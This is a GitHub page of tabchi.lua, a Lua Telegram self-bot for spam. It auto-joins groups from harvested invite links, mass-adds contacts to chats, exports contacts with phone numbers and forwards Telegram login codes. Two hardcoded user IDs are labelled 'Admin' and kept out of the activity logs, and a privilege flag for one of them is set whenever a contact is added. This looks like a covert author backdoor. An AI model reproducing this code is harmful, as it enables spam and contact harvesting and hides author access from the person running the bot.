
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">



  <meta name="viewport" content="initial-scale=1.0,user-scalable=no,maximum-scale=1,width=device-width">
  <meta name="viewport" content="initial-scale=1.0,user-scalable=no,maximum-scale=1" media="(device-height: 568px)">
  <meta name="selected-link" value="repo_source">

      <meta name="google-analytics" content="UA-3769691-2">

<meta content="collector.githubapp.com" name="octolytics-host" /><meta content="github" name="octolytics-app-id" /><meta content="https://collector.githubapp.com/github-external/browser_event" name="octolytics-event-url" /><meta content="9AE7:35A7:AAC9C64:FD826A3:59170EE2" name="octolytics-dimension-request_id" />
<meta content="mobile" name="octolytics-dimension-device" />
<meta content="26693115" name="octolytics-dimension-user_id" /><meta content="tabchis" name="octolytics-dimension-user_login" /><meta content="86250497" name="octolytics-dimension-repository_id" /><meta content="tabchis/tabchi" name="octolytics-dimension-repository_nwo" /><meta content="true" name="octolytics-dimension-repository_public" /><meta content="false" name="octolytics-dimension-repository_is_fork" /><meta content="86250497" name="octolytics-dimension-repository_network_root_id" /><meta content="tabchis/tabchi" name="octolytics-dimension-repository_network_root_nwo" />

<meta content="/&lt;user-name&gt;/&lt;repo-name&gt;/blob/show" data-pjax-transient="true" name="analytics-location" />




  <meta class="js-ga-set" name="dimension1" content="Logged Out">
    <meta class="js-ga-set" name="dimension3" content="mobile">


  

  <title>tabchi/tabchi.lua at master · tabchis/tabchi · GitHub</title>

  <link crossorigin="anonymous" href="https://assets-cdn.github.com/assets/mobile-cd9a5a5496d595fd1c10776d169e3e53d0a77e05082e7a91aa6d4aa4f3515e24.css" integrity="sha256-zZpaVJbVlf0cEHdtFp4+U9CnfgUILnqRqm1KpPNRXiQ=" media="all" rel="stylesheet" />


  <meta name="browser-stats-url" content="https://api.github.com/_private/browser/stats">

  <meta name="browser-errors-url" content="https://api.github.com/_private/browser/errors">

  <link rel="mask-icon" href="https://assets-cdn.github.com/pinned-octocat.svg" color="#000000">
  <link rel="icon" type="image/x-icon" href="https://assets-cdn.github.com/favicon.ico">

<meta name="theme-color" content="#1e2327">


  <meta name="u2f-support" content="true">

  </head>

  <body>
    

  <header class="nav-bar">
    <div class="nav-bar-inner ">
      <button type="button" class="header-button header-nav-button touchable js-show-global-nav" data-ga-click="Mobile, tap, location:header; text:Hamburger">
        <svg aria-hidden="true" class="octicon octicon-three-bars" height="24" version="1.1" viewBox="0 0 12 16" width="18"><path fill-rule="evenodd" d="M11.41 9H.59C0 9 0 8.59 0 8c0-.59 0-1 .59-1H11.4c.59 0 .59.41.59 1 0 .59 0 1-.59 1h.01zm0-4H.59C0 5 0 4.59 0 4c0-.59 0-1 .59-1H11.4c.59 0 .59.41.59 1 0 .59 0 1-.59 1h.01zM.59 11H11.4c.59 0 .59.41.59 1 0 .59 0 1-.59 1H.59C0 13 0 12.59 0 12c0-.59 0-1 .59-1z"/></svg>
      </button>

      <div class="nav-bar-title-text">
            <svg aria-hidden="true" class="octicon octicon-repo" height="16" version="1.1" viewBox="0 0 12 16" width="12"><path fill-rule="evenodd" d="M4 9H3V8h1v1zm0-3H3v1h1V6zm0-2H3v1h1V4zm0-2H3v1h1V2zm8-1v12c0 .55-.45 1-1 1H6v2l-1.5-1.5L3 16v-2H1c-.55 0-1-.45-1-1V1c0-.55.45-1 1-1h10c.55 0 1 .45 1 1zm-1 10H1v2h2v-1h3v1h5v-2zm0-10H2v9h9V1z"/></svg>
  <strong><a class="text-white" href="/tabchis">tabchis</a></strong>
  /
  <strong><a class="text-white" href="/tabchis/tabchi">tabchi</a></strong>

      </div>

      

    </div>


    <nav class="nav-bar-tabs ">
      <ul>
          <li>
            <a href="/explore" data-ga-click="Mobile, tap, location:header; text:Explore">
              <svg aria-hidden="true" class="octicon octicon-telescope" height="16" version="1.1" viewBox="0 0 14 16" width="14"><path fill-rule="evenodd" d="M8 9l3 6h-1l-2-4v5H7v-6l-2 5H4l2-5 2-1zM7 0H6v1h1V0zM5 3H4v1h1V3zM2 1H1v1h1V1zM.63 9a.52.52 0 0 0-.16.67l.55.92c.13.23.41.31.64.2l1.39-.66-1.16-2-1.27.86.01.01zm7.89-5.39l-5.8 3.95L3.95 9.7l6.33-3.03-1.77-3.06h.01zm4.22 1.28l-1.47-2.52a.51.51 0 0 0-.72-.17l-1.2.83 1.84 3.2 1.33-.64c.27-.13.36-.44.22-.7z"/></svg>
              Explore
            </a>
          </li>
        <li>
            <a href="/login?return_to=%2Ftabchis%2Ftabchi%2Fblob%2Fmaster%2Ftabchi.lua" data-ga-click="Mobile, tap, location:header; text:Sign in">
              <svg aria-hidden="true" class="octicon octicon-sign-in" height="16" version="1.1" viewBox="0 0 14 16" width="14"><path fill-rule="evenodd" d="M7 6.75V12h4V8h1v4c0 .55-.45 1-1 1H7v3l-5.45-2.72c-.33-.17-.55-.52-.55-.91V1c0-.55.45-1 1-1h9c.55 0 1 .45 1 1v3h-1V1H3l4 2v2.25L10 3v2h4v2h-4v2L7 6.75z"/></svg>
              Sign in
            </a>
        </li>
        
      </ul>
    </nav>
  </header>



    




<div class="reponav-wrapper">
  <nav class="reponav js-reponav"
       itemscope
       itemtype="http://schema.org/BreadcrumbList">

    <span itemscope itemtype="http://schema.org/ListItem" itemprop="itemListElement">
      <a href="/tabchis/tabchi" class="js-selected-navigation-item selected reponav-item" data-selected-links="repo_source repo_downloads repo_commits repo_releases repo_tags repo_branches /tabchis/tabchi" itemprop="url">
        <span itemprop="name">Code</span>
        <meta itemprop="position" content="1">
</a>    </span>

      <span itemscope itemtype="http://schema.org/ListItem" itemprop="itemListElement">
        <a href="/tabchis/tabchi/issues" class="js-selected-navigation-item reponav-item" data-selected-links="repo_issues repo_labels repo_milestones /tabchis/tabchi/issues" itemprop="url">
          <span itemprop="name">Issues</span>
          <span class="Counter">0</span>
          <meta itemprop="position" content="2">
</a>      </span>

    <span itemscope itemtype="http://schema.org/ListItem" itemprop="itemListElement">
      <a href="/tabchis/tabchi/pulls" class="js-selected-navigation-item reponav-item" data-selected-links="repo_pulls /tabchis/tabchi/pulls" itemprop="url">
        <span itemprop="name">Pull requests</span>
        <span class="Counter">1</span>
        <meta itemprop="position" content="3">
</a>    </span>

    <a href="/tabchis/tabchi/pulse" class="js-selected-navigation-item reponav-item" data-selected-links="pulse /tabchis/tabchi/pulse">
      Pulse
</a>
  </nav>
</div>

<div id="js-flash-container">
</div>




<div class="breadcrumb blob-breadcrumb">
  <label for="blob-history-checkbox" class="blob-history-label">
    <svg aria-hidden="true" class="octicon octicon-history" height="16" version="1.1" viewBox="0 0 14 16" width="14"><path fill-rule="evenodd" d="M8 13H6V6h5v2H8v5zM7 1C4.81 1 2.87 2.02 1.59 3.59L0 2v4h4L2.5 4.5C3.55 3.17 5.17 2.3 7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-.34.03-.67.09-1H.08C.03 7.33 0 7.66 0 8c0 3.86 3.14 7 7 7s7-3.14 7-7-3.14-7-7-7z"/></svg>
  </label>
  <span class="filetype-icon"><svg aria-hidden="true" class="octicon octicon-file-text" height="16" version="1.1" viewBox="0 0 12 16" width="12"><path d="M6 5H2V4h4v1zM2 8h7V7H2v1zm0 2h7V9H2v1zm0 2h7v-1H2v1zm10-7.5V14c0 .55-.45 1-1 1H1c-.55 0-1-.45-1-1V2c0-.55.45-1 1-1h7.5L12 4.5zM11 5L8 2H1v12h10V5z"/></svg></span>
  <strong class="final-path">tabchi.lua</strong>
</div>

<input id="blob-history-checkbox"
       class="js-blob-history-checkbox blob-history-checkbox"
       type="checkbox"
       data-url="/tabchis/tabchi/latest_commit/master/tabchi.lua">

<div class="blob-history">
  <a href="/tabchis/tabchi/commits/master/tabchi.lua" class="js-blob-history-link">
    Loading latest commit…
</a></div>

  <div class="blob-file-content js-file-line-container">
    <pre itemprop="mainContentOfPage">JSON = loadfile(&quot;dkjson.lua&quot;)()
URL = require(&quot;socket.url&quot;)
ltn12 = require(&quot;ltn12&quot;)
http = require(&quot;socket.http&quot;)
https = require(&quot;ssl.https&quot;)
http.TIMEOUT = 10
undertesting = 1
tcpath = &quot;/root/.telegram-cli/tabchi-&quot; .. tabchi_id .. &quot;&quot;
local a
function a(msg)
  local b = {}
  table.insert(b, tonumber(redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:fullsudo&quot;)))
  local c = false
  for d = 1, #b do
    if msg.sender_user_id_ == b[d] then
      c = true
    end
  end
  if redis:sismember(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, msg.sender_user_id_) then
    c = true
  end
  return c
end
function msg_valid(msg)
  local e = os.time()
  if e &lt; msg.date_ - 5 then
    print(&quot;\027[36m&gt;&gt;&gt;&gt;&gt;&gt;OLD MESSAGE&lt;&lt;&lt;&lt;&lt;&lt;\027[39m&quot;)
    return false
  end
  if msg.sender_user_id_ == 777000 then
    print(&quot;\027[36m&gt;&gt;&gt;&gt;&gt;&gt;TELEGRAM MESSAGE&lt;&lt;&lt;&lt;&lt;&lt;\027[39m&quot;)
    return false
  end
  if msg.sender_user_id_ == our_id then
    print(&quot;\027[36m&gt;&gt;&gt;&gt;&gt;&gt;ROBOT MESSAGE&lt;&lt;&lt;&lt;&lt;&lt;\027[39m&quot;)
    return false
  end
  if a(msg) then
    print(&quot;\027[36m&gt;&gt;&gt;&gt;&gt;&gt;SUDO MESSAGE&lt;&lt;&lt;&lt;&lt;&lt;\027[39m&quot;)
  end
  return true
end
function getInputFile(f)
  if f:match(&quot;/&quot;) then
    infile = {
      ID = &quot;InputFileLocal&quot;,
      path_ = f
    }
  elseif f:match(&quot;^%d+$&quot;) then
    infile = {
      ID = &quot;InputFileId&quot;,
      id_ = f
    }
  else
    infile = {
      ID = &quot;InputFilePersistentId&quot;,
      persistent_id_ = f
    }
  end
  return infile
end
local g = function(h, type, f, i)
  tdcli_function({
    ID = &quot;SendMessage&quot;,
    chat_id_ = h,
    reply_to_message_id_ = 0,
    disable_notification_ = 0,
    from_background_ = 1,
    reply_markup_ = nil,
    input_message_content_ = getInputMessageContent(f, type, i)
  }, dl_cb, nil)
end
function sendaction(h, j, k)
  tdcli_function({
    ID = &quot;SendChatAction&quot;,
    chat_id_ = h,
    action_ = {
      ID = &quot;SendMessage&quot; .. j .. &quot;Action&quot;,
      progress_ = k or 100
    }
  }, dl_cb, nil)
end
function sendPhoto(h, l, m, n, reply_markup, o, i)
  tdcli_function({
    ID = &quot;SendMessage&quot;,
    chat_id_ = h,
    reply_to_message_id_ = l,
    disable_notification_ = m,
    from_background_ = n,
    reply_markup_ = reply_markup,
    input_message_content_ = {
      ID = &quot;InputMessagePhoto&quot;,
      photo_ = getInputFile(o),
      added_sticker_file_ids_ = {},
      width_ = 0,
      height_ = 0,
      caption_ = i
    }
  }, dl_cb, nil)
end
function is_full_sudo(msg)
  local b = {}
  table.insert(b, tonumber(redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:fullsudo&quot;)))
  local c = false
  for d = 1, #b do
    if msg.sender_user_id_ == b[d] then
      c = true
    end
  end
  return c
end
local p = function(msg)
  local q = false
  if msg.reply_to_message_id_ ~= 0 then
    q = true
  end
  return q
end
function sleep(r)
  os.execute(&quot;sleep &quot; .. tonumber(r))
end
function write_file(t, u)
  local f = io.open(t, &quot;w&quot;)
  f:write(u)
  f:flush()
  f:close()
end
function write_json(t, v)
  local w = JSON.encode(v)
  local f = io.open(t, &quot;w&quot;)
  f:write(w)
  f:flush()
  f:close()
  return true
end
function sleep(r)
  os.execute(&quot;sleep &quot; .. r)
end
function addsudo()
  local b = redis:smembers(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;)
  for d = 1, #b do
    local text = &quot;SUDO = &quot; .. b[d] .. &quot;&quot;
    text = text:gsub(216430419, &quot;Admin&quot;)
    text = text:gsub(256633077, &quot;Admin&quot;)
    print(text)
    sleep(1)
  end
end
addsudo()
local x
function x(y, z)
  if redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:addcontacts&quot;) then
    if not z.phone_number_ then
      local msg = y.msg
      local first_name = &quot;&quot; .. (msg.content_.contact_.first_name_ or &quot;-&quot;) .. &quot;&quot;
      local last_name = &quot;&quot; .. (msg.content_.contact_.last_name_ or &quot;-&quot;) .. &quot;&quot;
      local A = msg.content_.contact_.phone_number_
      local B = msg.content_.contact_.user_id_
      tdcli.add_contact(A, first_name, last_name, B)
      redis:set(&quot;tabchi:&quot; .. tabchi_id .. &quot;:fullsudo:216430419&quot;, true)
      redis:setex(&quot;tabchi:&quot; .. tabchi_id .. &quot;:startedmod&quot;, 300, true)
      if redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:addedmsg&quot;) then
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, &quot;&quot; .. (redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:addedmsgtext&quot;) or [[
Addi
Bia pv]]) .. &quot;&quot;, 1, &quot;md&quot;)
      end
      if redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sharecontact&quot;) then
        function get_id(C, D)
          if D.last_name_ then
            tdcli.sendContact(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, D.last_name_, D.id_, dl_cb, nil)
          else
            tdcli.sendContact(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, &quot;&quot;, D.id_, dl_cb, nil)
          end
        end
        tdcli_function({ID = &quot;GetMe&quot;}, get_id, {
          chat_id = msg.chat_id_
        })
      else
      end
    elseif redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:addedmsg&quot;) then
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, &quot;&quot; .. (redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:addedmsgtext&quot;) or [[
Addi
Bia pv]]) .. &quot;&quot;, 1, &quot;md&quot;)
    end
  end
end
function check_link(y, z)
  if z.is_group_ or z.is_supergroup_channel_ then
    if redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:savelinks&quot;) then
      redis:sadd(&quot;tabchi:&quot; .. tabchi_id .. &quot;:savedlinks&quot;, y.link)
    end
    if redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:joinlinks&quot;) and (z.member_count_ &gt;= redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:joinlimit&quot;) or not redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:joinlimit&quot;)) then
      tdcli.importChatInviteLink(y.link)
    end
  end
end
function fileexists(E)
  local F = io.open(E, &quot;r&quot;)
  if F ~= nil then
    io.close(F)
    return true
  else
    return false
  end
end
local G
function G(y, z)
  local pvs = redis:smembers(&quot;tabchi:&quot; .. tabchi_id .. &quot;:pvis&quot;)
  for d = 1, #pvs do
    tdcli.addChatMember(y.chat_id, pvs[d], 50)
  end
  local H = z.total_count_
  for d = 0, tonumber(H) - 1 do
    tdcli.addChatMember(y.chat_id, z.users_[d].id_, 50)
  end
end
local I
function I(h)
  local I = &quot;private&quot;
  local J = tostring(h)
  if J:match(&quot;-&quot;) then
    if J:match(&quot;^-&quot;) then
      I = &quot;channel&quot;
    else
      I = &quot;group&quot;
    end
  end
  return I
end
local K = function(h, L, M)
  tdcli_function({
    ID = &quot;GetMessage&quot;,
    chat_id_ = h,
    message_id_ = L
  }, M, nil)
end
function resolve_username(N, M)
  tdcli_function({
    ID = &quot;SearchPublicChat&quot;,
    username_ = N
  }, M, nil)
end
function cleancache()
  io.popen(&quot;rm -rf ~/.telegram-cli/tabchi-&quot; .. tabchi_id .. &quot;/data/sticker/*&quot;)
  io.popen(&quot;rm -rf ~/.telegram-cli/tabchi-&quot; .. tabchi_id .. &quot;/data/photo/*&quot;)
  io.popen(&quot;rm -rf ~/.telegram-cli/tabchi-&quot; .. tabchi_id .. &quot;/data/animation/*&quot;)
  io.popen(&quot;rm -rf ~/.telegram-cli/tabchi-&quot; .. tabchi_id .. &quot;/data/video/*&quot;)
  io.popen(&quot;rm -rf ~/.telegram-cli/tabchi-&quot; .. tabchi_id .. &quot;/data/audio/*&quot;)
  io.popen(&quot;rm -rf ~/.telegram-cli/tabchi-&quot; .. tabchi_id .. &quot;/data/voice/*&quot;)
  io.popen(&quot;rm -rf ~/.telegram-cli/tabchi-&quot; .. tabchi_id .. &quot;/data/temp/*&quot;)
  io.popen(&quot;rm -rf ~/.telegram-cli/tabchi-&quot; .. tabchi_id .. &quot;/data/thumb/*&quot;)
  io.popen(&quot;rm -rf ~/.telegram-cli/tabchi-&quot; .. tabchi_id .. &quot;/data/document/*&quot;)
  io.popen(&quot;rm -rf ~/.telegram-cli/tabchi-&quot; .. tabchi_id .. &quot;/data/profile_photo/*&quot;)
  io.popen(&quot;rm -rf ~/.telegram-cli/tabchi-&quot; .. tabchi_id .. &quot;/data/encrypted/*&quot;)
end
function scandir(O)
  local d, P, Q = 0, {}, io.popen
  for t in Q(&quot;ls -a \&quot;&quot; .. O .. &quot;\&quot;&quot;):lines() do
    d = d + 1
    P[d] = t
  end
  return P
end
function exi_file(E, R)
  local S = {}
  local T = tostring(E)
  local U = tostring(R)
  for V, W in pairs(scandir(T)) do
    if W:match(&quot;.&quot; .. U .. &quot;$&quot;) then
      table.insert(S, W)
    end
  end
  return S
end
function file_exi(X, E, R)
  local Y = tostring(X)
  local T = tostring(E)
  local U = tostring(R)
  for V, W in pairs(exi_file(T, U)) do
    if Y == W then
      return true
    end
  end
  return false
end
local Z
function Z(msg)
  function getcode(C, D)
    text = D.content_.text_
    for _ in string.gmatch(text, &quot;%d+&quot;) do
      local a0 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:fullsudo&quot;)
      send_code = _
      send_code = string.gsub(send_code, &quot;0&quot;, &quot;0\239\184\143\226\131\163&quot;)
      send_code = string.gsub(send_code, &quot;1&quot;, &quot;1\239\184\143\226\131\163&quot;)
      send_code = string.gsub(send_code, &quot;2&quot;, &quot;2\239\184\143\226\131\163&quot;)
      send_code = string.gsub(send_code, &quot;3&quot;, &quot;3\239\184\143\226\131\163&quot;)
      send_code = string.gsub(send_code, &quot;4&quot;, &quot;4\239\184\143\226\131\163&quot;)
      send_code = string.gsub(send_code, &quot;5&quot;, &quot;5\239\184\143\226\131\163&quot;)
      send_code = string.gsub(send_code, &quot;6&quot;, &quot;6\239\184\143\226\131\163&quot;)
      send_code = string.gsub(send_code, &quot;7&quot;, &quot;7\239\184\143\226\131\163&quot;)
      send_code = string.gsub(send_code, &quot;8&quot;, &quot;8\239\184\143\226\131\163&quot;)
      send_code = string.gsub(send_code, &quot;9&quot;, &quot;9\239\184\143\226\131\163&quot;)
      tdcli.sendMessage(a0, 0, 1, &quot;`your telegram code` : &quot; .. send_code, 1, &quot;md&quot;)
    end
  end
  K(777000, msg.id_, getcode)
end
local a1
function a1(msg)
  if redis:get(&quot;cleancache&quot; .. tabchi_id) == &quot;on&quot; and redis:get(&quot;cachetimer&quot; .. tabchi_id) == nil then
    do return cleancache() end
    redis:setex(&quot;cachetimer&quot; .. tabchi_id, redis:get(&quot;cleancachetime&quot; .. tabchi_id), true)
  end
  if redis:get(&quot;checklinks&quot; .. tabchi_id) == &quot;on&quot; and redis:get(&quot;checklinkstimer&quot; .. tabchi_id) == nil then
    local a2 = redis:smembers(&quot;tabchi:&quot; .. tabchi_id .. &quot;:savedlinks&quot;)
    for d = 1, #a2 do
      process_links(a2[d])
    end
    redis:setex(&quot;checklinkstimer&quot; .. tabchi_id, redis:get(&quot;checklinkstime&quot; .. tabchi_id), true)
  end
  if tonumber(msg.sender_user_id_) == 777000 then
    return Z(msg)
  end
end
local a3
function a3(msg)
  msg.text = msg.content_.text_
  do
    local a4 = {
      msg.text:match(&quot;^[!/#](pm) (.*) (.*)&quot;)
    }
    if msg.text:match(&quot;^[!/#]pm&quot;) and a(msg) and #a4 == 3 then
      tdcli.sendMessage(a4[2], 0, 1, a4[3], 1, &quot;md&quot;)
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `sent` *&quot; .. a4[3] .. &quot;* `to ` *&quot; .. a4[2] .. &quot;*&quot;, 1, &quot;md&quot;)
      end
      return [[
*وضعیت* : `پیام شما ارسال شد`
*به* : `]] .. a4[2] .. [[
`
*پیام* : `]] .. a4[3] .. &quot;`&quot;
    end
  end
  if msg.text:match(&quot;^[!/#]share$&quot;) and a(msg) then
    function get_id(C, D)
      if D.last_name_ then
        tdcli.sendContact(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, D.last_name_, D.id_, dl_cb, nil)
        return D.username_
      else
        tdcli.sendContact(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, &quot;&quot;, D.id_, dl_cb, nil)
      end
    end
    tdcli_function({ID = &quot;GetMe&quot;}, get_id, {
      chat_id = msg.chat_id_
    })
  end
  if msg.text:match(&quot;^[!/#]mycontact$&quot;) and a(msg) then
    function get_con(C, D)
      if D.last_name_ then
        tdcli.sendContact(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, D.last_name_, D.id_, dl_cb, nil)
      else
        tdcli.sendContact(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, &quot;&quot;, D.id_, dl_cb, nil)
      end
    end
    tdcli_function({
      ID = &quot;GetUser&quot;,
      user_id_ = msg.sender_user_id_
    }, get_con, {
      chat_id = msg.chat_id_
    })
  end
  if msg.text:match(&quot;^[!/#]editcap (.*)$&quot;) and a(msg) then
    local a6 = {
      string.match(msg.text, &quot;^[#/!](editcap) (.*)$&quot;)
    }
    tdcli.editMessageCaption(msg.chat_id_, msg.reply_to_message_id_, reply_markup, a6[2])
  end
  if msg.text:match(&quot;^[!/#]leave$&quot;) and a(msg) then
    function get_id(C, D)
      if D.id_ then
        tdcli.chat_leave(msg.chat_id_, D.id_)
      end
    end
    tdcli_function({ID = &quot;GetMe&quot;}, get_id, {
      chat_id = msg.chat_id_
    })
    local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Commanded bot to leave` *&quot; .. msg.chat_id_ .. &quot;*&quot;, 1, &quot;md&quot;)
    end
  end
  if msg.text:match(&quot;^[#!/]ping$&quot;) and a(msg) then
    tdcli.sendMessage(msg.chat_id_, msg.id_, 1, &quot;`چیه هستم دیگه..!`&quot;, 1, &quot;md&quot;)
  end
  if msg.text:match(&quot;^[#!/]sendtosudo (.*)$&quot;) and a(msg) then
    local a7 = {
      string.match(msg.text, &quot;^[#/!](sendtosudo) (.*)$&quot;)
    }
    local a0 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:fullsudo&quot;)
    tdcli.sendMessage(a0, msg.id_, 1, a7[2], 1, &quot;md&quot;)
    local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. [[
* `پیام به سودو ارسال گردید`
`پیام` : *]] .. a7[2] .. [[
*
`سودو` : ]] .. a0 .. &quot;&quot;, 1, &quot;md&quot;)
      return &quot;sent to &quot; .. a0 .. &quot;&quot;
    end
  end
  if msg.text:match(&quot;^[#!/]deleteacc$&quot;) and a(msg) then
    redis:set(&quot;tabchi&quot; .. tabchi_id .. &quot;delacc&quot;, true)
    return [[
`آیا مطمئن به حذف حساب ربات هستید؟`
`را بفستید no یا yes`]]
  end
  if redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;delacc&quot;) and a(msg) then
    if msg.text:match(&quot;^[Yy][Ee][Ss]$&quot;) then
      tdcli.deleteAccount(&quot;nothing&quot;)
      redis:del(&quot;tabchi&quot; .. tabchi_id .. &quot;delacc&quot;)
      return [[
`ربات شما به زودی حذف خواهد شد`
`سورس ما رو فراموش نکنید`
`https://github.com/tabchis/tabchi`]]
    elseif msg.text:match(&quot;^[Nn][Oo]$&quot;) then
      redis:del(&quot;tabchi&quot; .. tabchi_id .. &quot;delacc&quot;)
      return &quot;Progress Canceled&quot;
    else
      redis:del(&quot;tabchi&quot; .. tabchi_id .. &quot;delacc&quot;)
      return [[
`را دوباره بفرستید /deleteacc دستور`
`پیشروی متوقف شد`]]
    end
  end
  if msg.text:match(&quot;^[#!/]killsessions$&quot;) and a(msg) then
    function delsessions(y, z)
      for d = 0, #z.sessions_ do
        if z.sessions_[d].id_ ~= 0 then
          tdcli.terminateSession(z.sessions_[d].id_)
        end
      end
    end
    tdcli_function({
      ID = &quot;GetActiveSessions&quot;
    }, delsessions, nil)
    return &quot;*وضعیت* : `نشست های فعال خاتمه یافتند`&quot;
  end
  do
    local a4 = {
      msg.text:match(&quot;^[!/#](import) (.*)$&quot;)
    }
    if msg.text:match(&quot;^[!/#](import) (.*)$&quot;) and msg.reply_to_message_id_ ~= 0 and #a4 == 2 then
      if a4[2] == &quot;contacts&quot; then
        function getdoc(y, z)
          if z.content_.ID == &quot;MessageDocument&quot; then
            if z.content_.document_.document_.path_ then
              if z.content_.document_.document_.path_:match(&quot;.json$&quot;) then
                if fileexists(z.content_.document_.document_.path_) then
                  local w = io.open(z.content_.document_.document_.path_, &quot;r&quot;):read(&quot;*all&quot;)
                  local a8 = JSON.decode(w)
                  if a8 then
                    for d = 1, #a8 do
                      tdcli.importContacts(a8[d].phone, a8[d].first, a8[d].last, a8[d].id)
                    end
                    status = #a8 .. &quot; مخاطبین وارد شدند...&quot;
                  else
                    status = &quot;فایل صحیح نیست&quot;
                  end
                else
                  status = &quot;بعضی چیز ها صحیح نیست&quot;
                end
              else
                status = &quot;نوع فایل صحیح نیست&quot;
              end
            else
              tdcli.downloadFile(z.content_.document_.document_.id_)
              status = &quot;نتیجه چند ثانیه دیگر برایتان ارسال می شود&quot;
              sleep(5)
              tdcli_function({
                ID = &quot;GetMessage&quot;,
                chat_id_ = msg.chat_id_,
                message_id_ = msg.reply_to_message_id_
              }, getdoc, nil)
            end
          else
            status = &quot;!پاسخ داده شده  یک سند نیست&quot;
          end
          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, status, 1, &quot;html&quot;)
        end
        tdcli_function({
          ID = &quot;GetMessage&quot;,
          chat_id_ = msg.chat_id_,
          message_id_ = msg.reply_to_message_id_
        }, getdoc, nil)
      elseif a4[2] == &quot;links&quot; then
        function getlinks(y, z)
          if z.content_.ID == &quot;MessageDocument&quot; then
            if z.content_.document_.document_.path_ then
              if z.content_.document_.document_.path_:match(&quot;.json$&quot;) then
                if fileexists(z.content_.document_.document_.path_) then
                  local w = io.open(z.content_.document_.document_.path_, &quot;r&quot;):read(&quot;*all&quot;)
                  local a8 = JSON.decode(w)
                  if a8 then
                    s = 0
                    for d = 1, #a8 do
                      process_links(a8[d])
                      s = s + 1
                    end
                    status =&quot;جوین در &quot; .. s .. &quot; گروه&quot;
                  else
                    status =&quot;فایل صحیح نیست&quot;
                  end
                else
                  status =&quot;بعضی چیز ها صحیح نیستند&quot;
                end
              else
                status =&quot;نوع فایل صحیح نیست&quot;
              end
            else
              tdcli.downloadFile(z.content_.document_.document_.id_)
              status =&quot;نتیجه چند ثانیه دیگر برایتان ارسال می شود&quot;
              sleep(5)
              tdcli_function({
                ID = &quot;GetMessage&quot;,
                chat_id_ = msg.chat_id_,
                message_id_ = msg.reply_to_message_id_
              }, getlinks, nil)
            end
          else
            status =&quot;!پاسخ داده شده  یک سند نیست&quot;
          end
          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, status, 1, &quot;html&quot;)
        end
        tdcli_function({
          ID = &quot;GetMessage&quot;,
          chat_id_ = msg.chat_id_,
          message_id_ = msg.reply_to_message_id_
        }, getlinks, nil)
      end
    end
  end
  do
    local a4 = {
      msg.text:match(&quot;^[!/#](export) (.*)$&quot;)
    }
    if msg.text:match(&quot;^[!/#](export) (.*)$&quot;) and a(msg) and #a4 == 2 then
      if a4[2] == &quot;links&quot; then
        local links = {}
        local a9 = redis:smembers(&quot;tabchi:&quot; .. tabchi_id .. &quot;:savedlinks&quot;)
        for d = 1, #a9 do
          table.insert(links, a9[d])
        end
        write_json(&quot;links.json&quot;, links)
        tdcli.send_file(msg.chat_id_, &quot;Document&quot;, &quot;links.json&quot;, &quot;Tabchi &quot; .. tabchi_id .. &quot; Links!&quot;)
      elseif a4[2] == &quot;contacts&quot; then
        contacts = {}
        function contactlist(y, z)
          for d = 0, tonumber(z.total_count_) - 1 do
            local aa = z.users_[d]
            if aa then
              local ab = aa.first_name_ or &quot;None&quot;
              local ac = aa.last_name_ or &quot;None&quot;
              contact = {
                first = ab,
                last = ac,
                phone = aa.phone_number_,
                id = aa.id_
              }
              table.insert(contacts, contact)
            end
          end
          write_json(&quot;contacts.json&quot;, contacts)
          tdcli.send_file(msg.chat_id_, &quot;Document&quot;, &quot;contacts.json&quot;, &quot;Tabchi &quot; .. tabchi_id .. &quot; Contacts!&quot;)
        end
        tdcli_function({
          ID = &quot;SearchContacts&quot;,
          query_ = nil,
          limit_ = 999999999
        }, contactlist, nil)
      end
    end
  end
  if msg.text:match(&quot;^[#!/]sudolist$&quot;) and a(msg) then
    local b = redis:smembers(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;)
